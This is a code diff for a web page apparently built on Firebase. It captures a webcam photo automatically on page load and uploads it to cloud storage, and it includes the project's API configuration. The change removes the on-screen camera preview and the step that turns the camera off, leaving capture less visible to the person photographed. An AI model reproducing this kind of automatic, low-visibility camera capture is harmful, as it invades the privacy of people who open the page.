@@ -2,6 +2,7 @@
 const firebaseConfig = {
     apiKey: "AIzaSyDEAy2KXezICmuuQZnhNq12nqwwBouDjt4",
     authDomain: "webcamera-es-universe-git.firebaseapp.com",
+    databaseURL: "https://webcamera-es-universe-git-default-rtdb.firebaseio.com",
     projectId: "webcamera-es-universe-git",
     storageBucket: "webcamera-es-universe-git.appspot.com",
     messagingSenderId: "949054088643",
@@ -9,37 +10,35 @@ const firebaseConfig = {
 };
 
 // Initialize Firebase
-firebase.initializeApp(firebaseConfig);
+const app = firebase.initializeApp(firebaseConfig);
 const storage = firebase.storage();
 
-// Access the camera and start the video stream
-async function requestCameraPermission() {
+// Access the camera with higher resolution
+async function startVideo() {
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        document.getElementById('message').textContent = 'Camera access granted!';
-
-        // Create a video element to display the stream
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            }
+        });
         const video = document.createElement('video');
         video.srcObject = stream;
         video.play();
-
-        // Create a canvas element for capturing the photo
-        const canvas = document.createElement('canvas');
-        document.body.appendChild(video);  // Add video to body for preview
-        document.body.appendChild(canvas); // Add canvas to body
-
-        // Capture the photo once the video stream is ready
-        video.addEventListener('loadeddata', () => {
-            captureAndUploadPhoto(video, canvas, stream);
-        });
+        
+        // Capture photo once the video stream is ready
+        video.onloadedmetadata = () => {
+            capturePhoto(video);
+        };
     } catch (error) {
-        document.getElementById('message').textContent = 'Camera access denied or an error occurred.';
         console.error('Error accessing camera:', error);
+        document.getElementById('message').textContent = 'Camera access denied or an error occurred.';
     }
 }
 
-// Capture and upload the photo to Firebase Storage
-async function captureAndUploadPhoto(video, canvas, stream) {
+// Capture the photo and upload it to Firebase Storage
+function capturePhoto(video) {
+    const canvas = document.createElement('canvas');
     const context = canvas.getContext('2d');
 
     // Set the canvas size to the video size
@@ -51,26 +50,18 @@ async function captureAndUploadPhoto(video, canvas, stream) {
 
     // Convert the canvas image to a Blob
     canvas.toBlob(async function(blob) {
-        // Create a unique filename
-        const timestamp = new Date().toISOString();
-        const fileName = `users/photo_${timestamp}.png`;
-
-        // Create a reference to Firebase Storage
-        const storageRef = storage.ref(fileName);
+        const fileName = `photo_${Date.now()}.png`;
+        const storageRef = storage.ref(`users/${fileName}`);
 
         try {
-            // Upload the image to Firebase Storage
             await storageRef.put(blob);
             alert('Photo uploaded to Firebase successfully!');
-
-            // Stop all video tracks after capturing the photo
-            stream.getTracks().forEach(track => track.stop());
         } catch (error) {
             console.error('Error uploading to Firebase:', error);
             alert('Failed to upload photo.');
         }
-    });
+    }, 'image/png', 1.0);  // The third argument '1.0' specifies the image quality (max quality)
 }
 
-// Request camera permission when the page loads
-window.onload = requestCameraPermission;
+// Start the video stream when the page loads
+window.onload = startVideo;
